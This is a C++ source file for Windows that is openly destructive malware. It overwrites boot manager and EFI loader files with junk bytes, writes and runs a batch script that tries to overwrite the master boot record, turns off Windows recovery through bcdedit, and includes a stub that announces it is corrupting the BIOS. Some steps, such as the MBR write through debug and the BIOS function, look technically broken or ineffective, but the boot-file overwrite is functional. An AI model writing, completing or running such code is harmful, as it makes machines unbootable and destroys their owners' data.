#include <windows.h>
#include <fstream>
#include <string>

void ModifyBootloader() {
    try {
        std::string bootFiles[] = {
            "C:\\bootmgr",
            "C:\\Boot\\BCD",
            "C:\\Boot\\boot.sdi",
            "C:\\Windows\\Boot\\EFI\\bootmgr.efi",
            "C:\\Windows\\Boot\\EFI\\bootmgfw.efi"
        };

        for (const auto& file : bootFiles) {
            std::ofstream out(file, std::ios::binary);
            if (out) {
                for (int i = 0; i < 1024; i++) {
                    out.put(static_cast<char>(0xFF));  // <--- ПРИВЕДЕНИЕ ТИПА
                }
                out.close();
            }
        }

        std::ofstream mbrScript("C:\\mbr_hack.bat");
        if (mbrScript) {
            mbrScript << "@echo off\n";
            mbrScript << "echo Writing to MBR...\n";
            mbrScript << "echo 0000: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 > mbr.hex\n";
            mbrScript << "debug < mbr.hex\n";
            mbrScript << "del mbr.hex\n";
            mbrScript << "echo MBR overwritten!\n";
            mbrScript.close();
            system("C:\\mbr_hack.bat");
        }

        system("bcdedit /set {default} recoveryenabled no");
        system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
        system("bcdedit /set {default} bootmenupolicy legacy");
    } catch (...) {}
}

void ModifyBIOS() {
    try {
        system("wmic bios set /? 2>NUL");
        system("echo Attempting to corrupt BIOS...");
    } catch (...) {}
}
